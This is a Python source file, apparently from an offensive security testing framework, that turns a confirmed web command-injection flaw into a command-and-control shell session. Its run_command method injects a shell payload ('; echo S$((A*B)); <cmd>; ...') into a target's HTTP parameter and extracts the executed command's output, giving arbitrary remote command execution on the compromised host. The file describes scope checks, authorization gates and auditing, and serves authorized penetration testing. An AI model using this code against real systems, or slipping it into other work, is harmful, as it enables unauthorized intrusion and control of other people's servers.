"""Web-shell C2 backend — a live session whose transport is a proven web RCE.

This is the wire from Phase D to Phase C: a confirmed command-injection finding
is not just a report line, it is a *channel*. :class:`WebShellBackend` implements
the :class:`~attack_engine.c2.backend.C2Backend` protocol over that channel, so
the existing :class:`~attack_engine.c2.foothold.FootholdRunner` can open, prove,
and tear down a real session on the web-RCE'd host — governed by the same signed
scope, authorization gate, audit, and kill-switch as any other foothold.

``run_command`` sends the command through the injection point via the
scope-enforcing Tool Runner (rule #2) and returns only the shell's *own* output,
extracted between computed guards (``echo S$((A*B)); <cmd>; echo $((B*A))E`` →
``S<A*B> … <A*B>E``) so a page that merely reflects the payload can never be
mistaken for execution. Output is bounded — a foothold proof reads identity/host,
not target data. The backend is stateless (a web shell holds no persistent
handle), so ``close`` just marks it torn down.
"""

from __future__ import annotations

import html
import re
from dataclasses import dataclass, field
from typing import Any

from ..logging import get_logger
from ..schemas.findings import Finding
from ..schemas.tools import ToolProfile
from ..toolrunner.runner import ToolRunner
from ..toolrunner.wrappers.http_probe import HttpProbeWrapper
from .session import Session

_log = get_logger("c2.webshell")

_A, _B = 9091, 9067
_PRODUCT = str(_A * _B)  # 82428097 — computed by the shell, absent from reflected input
_START = f"S{_PRODUCT}"
_END = f"{_PRODUCT}E"
_TAGS = re.compile(r"<[^>]+>")


@dataclass(frozen=True)
class WebInjectionPoint:
    """The confirmed command-injection point a web shell operates through."""

    param: str
    path: str = "/"
    scheme: str = "http"
    port: int | None = None
    method: str = "GET"
    base_value: str = "127.0.0.1"
    #: Extra fixed fields the target request needs (page selector, submit button…).
    params: dict[str, str] = field(default_factory=dict)
    data: dict[str, str] = field(default_factory=dict)

    @classmethod
    def from_finding(cls, finding: Finding) -> WebInjectionPoint:
        md = finding.metadata
        param = md.get("param")
        if not param:
            raise ValueError("finding has no injection param in metadata")
        port = md.get("port")
        return cls(
            param=str(param),
            path=str(md.get("path", "/")),
            scheme=str(md.get("scheme", "http")),
            port=int(port) if isinstance(port, int) else None,
            method=str(md.get("method", "GET")).upper(),
            base_value=str(md.get("base_value", "127.0.0.1")),
            params=dict(md.get("params") or {}),
            data=dict(md.get("data") or {}),
        )


class WebShellBackend:
    """A :class:`C2Backend` over a confirmed web command-injection point."""

    def __init__(
        self,
        tool_runner: ToolRunner,
        injection: WebInjectionPoint,
        *,
        max_output: int = 8192,
    ) -> None:
        self._runner = tool_runner
        self._inj = injection
        self._max = max_output
        self._closed: set[str] = set()

    def alive(self, session: Session) -> bool:
        if session.id in self._closed:
            return False
        # A liveness ping IS an execution: only a real shell echoes the marker back.
        return self.run_command(session, "echo ae-alive") == "ae-alive"

    def run_command(self, session: Session, command: str) -> str:
        if session.id in self._closed:
            return ""
        inj = self._inj
        payload = f"{inj.base_value}; echo S$(({_A}*{_B})); {command}; echo $(({_B}*{_A}))E"
        inject_key = "data" if inj.method in ("POST", "PUT") else "params"
        params = dict(inj.params)
        data = dict(inj.data)
        (data if inject_key == "data" else params)[inj.param] = payload
        args: dict[str, Any] = {"scheme": inj.scheme, "port": inj.port,
                                "path": inj.path, "method": inj.method}
        if params:
            args["params"] = params
        if data:
            args["data"] = data
        result = self._runner.run("http_probe", session.host, ToolProfile(args=args))
        body = HttpProbeWrapper.body_of(result.raw).decode("utf-8", "replace")
        text = html.unescape(_TAGS.sub("", body))
        m = re.search(re.escape(_START) + r"(.*?)" + re.escape(_END), text, re.S)
        return m.group(1).strip()[: self._max] if m else ""

    def close(self, session: Session) -> None:
        self._closed.add(session.id)
        _log.info("web shell closed", session=session.id, host=session.host)


def web_shell_backend(tool_runner: ToolRunner, finding: Finding) -> WebShellBackend:
    """Build a web-shell backend from a confirmed command-injection Finding."""

    return WebShellBackend(tool_runner, WebInjectionPoint.from_finding(finding))
